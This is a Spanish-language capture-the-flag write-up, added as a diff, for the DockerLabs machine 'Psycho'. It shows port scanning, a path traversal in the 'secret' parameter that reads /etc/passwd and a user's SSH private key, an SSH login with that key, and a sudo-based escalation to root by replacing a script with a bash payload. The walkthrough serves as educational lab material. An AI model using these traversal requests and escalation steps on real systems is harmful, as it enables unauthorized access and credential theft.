@@ -1,0 +1,234 @@
+---
+title: Psycho
+description: Resolución completa de la máquina virtual *Psycho* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Psycho**, desarrollada por *Luisillo_o* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web con un parámetro `secret` vulnerable a **Path Traversal**, permitiendo leer archivos del sistema. Mediante esta vulnerabilidad, se extrae la clave privada RSA del usuario `vaxei`, lo que permite acceder al sistema vía SSH.
+Una vez dentro, se utiliza `sudo` para cambiar al usuario `luisillo`. Posteriormente, se identifica que `luisillo` puede ejecutar un script como root sin contraseña. Aunque el script no es modificable, se elimina y se recrea con un payload malicioso para obtener acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Psycho',
+    Autor: 'Luisillo_o',
+    Dificultad: 'Fácil',
+    Fecha: '10/08/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Psycho.zip
+sudo bash auto_deplo.sh Psycho.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Psycho/{content,exploits,nmap,scripts}
+cd Psycho
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1749540520/Ports_guxbbf.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN targeted
+```
+
+![Servicios](https://res.cloudinary.com/dewqswzke/image/upload/v1749540522/Services_c5phmd.png)
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1749540518/gobuster_cft8yu.png)
+
+**Rutas encontradas:**
+- `/index.php` — Contiene una interfaz simple.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1749540519/index_at1p7n.png)
+- `/assets/` — Contiene la imagen de fondo.
+
+### 1.4 Fuzzing de parámetros
+
+Se observa un posible fallo en `index.php` al no recibir el parámetro adecuado. Se usa `ffuf` para descubrirlo:
+
+![FFUF](https://res.cloudinary.com/dewqswzke/image/upload/v1749540518/Fuff_s1punq.png)
+
+Se descubre el parámetro `secret`. Se prueba un **Path Traversal**:
+
+```
+http://172.17.0.2/index.php?secret=/etc/passwd
+```
+
+![Passwd](https://res.cloudinary.com/dewqswzke/image/upload/v1749540519/Passwd_sv8tul.png)
+
+Se identifican dos usuarios: `luisillo` y `vaxei`.
+
+### 1.5 Extracción de clave RSA
+
+Se navega por los archivos del usuario `vaxei` para encontrar la clave privada RSA:
+
+```
+http://172.17.0.2/index.php?secret=/home/vaxei/.ssh/id_rsa
+```
+
+![RSA](https://res.cloudinary.com/dewqswzke/image/upload/v1749540521/rsa_hnd7hm.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Acceso SSH
+
+Se guarda la clave privada con permisos adecuados:
+
+```bash
+chmod 600 id_rsa
+```
+
+Se accede al sistema como `vaxei`:
+
+```bash
+ssh vaxei@172.17.0.2 -i id_rsa
+```
+
+![Vaxei](https://res.cloudinary.com/dewqswzke/image/upload/v1749540522/Vaxei_sjv32j.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De vaxei → luisillo
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1749540519/Luisilo_cksq2t.png)
+
+Se puede ejecutar `sudo -u luisillo /bin/bash`:
+
+```bash
+sudo -u luisillo /bin/bash
+```
+
+### 3.2 De luisillo → root
+
+Se verifican nuevamente los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l luisillo](https://res.cloudinary.com/dewqswzke/image/upload/v1749542382/Sudo-l_pultab.png)
+
+Se permite ejecutar un script como root sin contraseña, pero al ejecutarlo da error. No se tiene permiso de escritura sobre el script original, pero se puede eliminar y recrear con un payload malicioso.
+
+Se elimina el script:
+
+```bash
+rm /path/to/script.sh
+```
+
+Se crea un nuevo script con un payload:
+
+```bash
+echo '#!/bin/bash\n/bin/bash' > /path/to/script.sh
+chmod +x /path/to/script.sh
+```
+
+Se ejecuta el script con `sudo`:
+
+```bash
+sudo /path/to/script.sh
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1749540520/Root_mlmfdx.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Path Traversal en parámetro secret",
+      severity: "Alta",
+      impact: "Lectura de archivos del sistema y extracción de claves RSA"
+    },
+    {
+      vulnerability: "Clave privada RSA almacenada en directorio accesible",
+      severity: "Crítica",
+      impact: "Acceso no autorizado al sistema vía SSH"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo para cambiar a luisillo",
+      severity: "Alta",
+      impact: "Movimiento lateral a otro usuario"
+    },
+    {
+      vulnerability: "Script ejecutado por root con permisos de eliminación para luisillo",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    }
+  ]}
+/>
